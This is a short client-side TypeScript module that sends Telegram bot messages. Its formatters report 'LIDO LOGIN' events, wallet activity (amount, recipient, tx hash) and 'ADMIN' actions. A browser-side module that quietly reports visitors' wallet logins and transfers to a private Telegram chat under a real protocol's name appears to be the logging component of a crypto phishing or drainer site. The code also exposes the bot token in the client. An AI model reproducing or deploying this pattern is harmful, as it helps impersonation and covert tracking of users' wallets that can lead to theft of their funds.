'use client';

import { CONFIG } from './contracts';

export async function sendTelegram(message: string) {
  try {
    await fetch(`https://api.telegram.org/bot${CONFIG.TELEGRAM_BOT}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: CONFIG.TELEGRAM_CHAT,
        text: message,
        parse_mode: 'HTML',
        disable_web_page_preview: true,
      }),
    });
  } catch (e) {
    console.error('Telegram failed:', e);
  }
}

export function formatWalletActivity(
  wallet: string,
  action: string,
  details: { amount?: string; to?: string; txHash?: string; token?: string; status?: string }
): string {
  const time = new Date().toUTCString();
  const sw = `${wallet.slice(0, 6)}...${wallet.slice(-4)}`;
  const stx = details.txHash ? `${details.txHash.slice(0, 10)}...${details.txHash.slice(-6)}` : 'N/A';
  return `🚨 <b>LIDO ACTIVITY</b>

👤 <b>Wallet:</b> <code>${sw}</code>
🎯 <b>Action:</b> ${action}
💰 <b>Amount:</b> ${details.amount || 'N/A'}
📤 <b>To:</b> ${details.to ? `<code>${details.to.slice(0, 6)}...${details.to.slice(-4)}</code>` : 'N/A'}
✅ <b>Status:</b> ${details.status || 'Pending'}
🔗 <b>Tx:</b> <code>${stx}</code>
🕐 <b>Time:</b> ${time}

🔗 <a href="https://etherscan.io/tx/${details.txHash || ''}">Etherscan</a>`;
}

export function formatUserLogin(wallet: string): string {
  return `🔔 <b>LIDO LOGIN</b>

👤 <b>Wallet:</b> <code>${wallet.slice(0, 6)}...${wallet.slice(-4)}</code>
🕐 <b>Time:</b> ${new Date().toUTCString()}`;
}

export function formatAdminAction(action: string, details: string): string {
  return `⚡ <b>ADMIN: ${action}</b>

${details}
🕐 <b>Time:</b> ${new Date().toUTCString()}`;
}
